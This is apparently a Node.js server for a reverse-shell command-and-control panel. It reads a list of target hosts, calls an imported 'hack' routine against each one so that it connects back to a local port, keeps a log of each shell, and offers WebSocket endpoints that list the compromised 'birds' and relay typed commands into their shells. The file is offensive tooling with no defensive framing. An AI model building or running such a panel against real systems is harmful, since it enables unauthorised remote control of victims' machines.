
const hack = require('./hack');

var app = require('express')();
var expressWs = require('express-ws')(app);
var http = require('http').Server(app);

var path = require('path');
var _ = require('lodash');

var fs = require('fs');

module.exports = function (config) {

    var targetListFile = path.join(__dirname, 'target-list.txt')


    var targets = [];
    var links = [];
    var logs = [];
    var inrNum = 0;

    fs.watchFile(targetListFile, () => {
        linkTargets();
    });

    function linkTargets() {
        var targetListContent = fs.readFileSync(targetListFile, 'utf-8');
        var _targets = targetListContent.split('\n');
        _targets.forEach((_target) => {
            if (_.findIndex(targets, (target) => { return target == _target }) == -1) {
                link(_target)
            }
        })
    }

    linkTargets();


    function link(target) {
        targets.push(target)
        inrNum += 1;
        var localPort = config.startLocalPort + inrNum;
        logs[localPort] = '';
        hack(target, config.localIp + ':' + localPort, (nc) => {
            var _target = {
                host: target,
                localPort: localPort,
                linkTime: new Date()
            };

            links.push({
                ..._target,
                nc: nc
            });

            nc.on('data', function (data) {
                logs[localPort] += data;
            });

        });
    }


    app.ws('/birds', function (ws, req) {
        var data = links.map((link) => {
            return {
                key: link.localPort,
                host: link.host,
                localPort: link.localPort,
                linkTime: link.linkTime
            }
        });
        ws.send(JSON.stringify(data))
    })


    app.ws('/terminals/:pid', function (ws, req) {
        var pid = parseInt(req.params.pid);
        var link = _.find(links, { localPort: pid });

        var nc = link && link.nc;
        if (nc) {
            var log = logs[pid] || '';
            ws.send(log);
            nc.on('data', function (data) {
                try {
                    ws.send(data);
                } catch (ex) {
                    // The WebSocket is not open, ignore
                }
            });
            ws.on('message', function (msg) {
                nc.write(msg);
            });
        }


    });

    app.listen(config.port, function () {
        console.log('listening on *:' + config.port);
    });
}





